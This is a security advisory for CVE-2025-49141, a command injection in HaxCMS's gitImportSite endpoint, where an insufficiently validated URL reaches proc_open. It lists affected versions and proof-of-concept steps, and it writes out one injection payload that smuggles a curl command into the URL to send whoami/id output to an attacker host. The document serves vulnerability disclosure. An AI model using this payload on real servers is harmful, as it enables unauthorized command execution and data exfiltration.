# [H] HaxCMS-PHP Command Injection Vulnerability

## Summary
Severity: High
Advisory: GHSA-g4cf-pp4x-hqgw
CVE: CVE-2025-49141
CWE: CWE-78
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2025-06-09
Source: https://github.com/advisories/GHSA-g4cf-pp4x-hqgw
Type: github-advisory

## Affected
- npm: `@haxtheweb/haxcms-nodejs` — affected >=0 <11.0.3

## Details
### Summary
The 'gitImportSite' functionality obtains a URL string from a POST request and insufficiently validates user input. The ’set_remote’ function later passes this input into ’proc_open’, yielding OS command injection.

### Details
The vulnerability exists in the logic of the ’gitImportSite’ function, located in ’Operations.php’. The current implementation only relies on the ’filter_var’ and 'strpos' functions to validate the URL, which is not sufficient to ensure absence of all Bash special characters used for command injection.
![gitImportSite](https://github.com/user-attachments/assets/af9935ef-4735-446d-833f-2c2590ff1508)

#### Affected Resources
• Operations.php:2103 gitImportSite()
• \<domain\>/\<user\>/system/api/gitImportSite



### PoC
To replicate this vulnerability, authenticate and send a POST request to the 'gitImportSite' endpoint with a crafted URL in the JSON data. Note, a valid token needs to be obtained by capturing a request to another API endpoint (such as 'archiveSite').

1. Start a webserver.
![webserver](https://github.com/user-attachments/assets/8594f9b1-67fa-4352-bbc3-310bb164ec9b)

2. Initiate a request to the ’archiveSite’ endpoint.
![archiveSite](https://github.com/user-attachments/assets/08503f36-d984-4d53-8fe6-577ad78d5eb7)

3.  Capture and modify the request in BurpSuite.
![request-modification](https://github.com/user-attachments/assets/61cd211e-afd3-453e-b86b-58bccffaf824)






4. Observe command output in the HTTP request from the server.
![command-output](https://github.com/user-attachments/assets/35f32274-b709-41d5-adaa-bea48f5cf33c)


#### Command Injection Payload
```Bash
http://<IP>/.git;curl${IFS}<IP>/$(whoami)/$(id)#=abcdef
```


### Impact
An authenticated attacker can craft a URL string that bypasses the validation checks employed by the ’filter_var’ and ’strpos’ functions in order to execute arbitrary OS commands on the backend server. The attacker can exfiltrate command output via an HTTP request.

## References
- https://github.com/haxtheweb/issues/security/advisories/GHSA-g4cf-pp4x-hqgw
- https://nvd.nist.gov/vuln/detail/CVE-2025-49141
- https://github.com/haxtheweb/haxcms-nodejs/commit/5131fea6b6be611db76a618f89bd2e164752e9b3
- https://github.com/haxtheweb/haxcms-nodejs
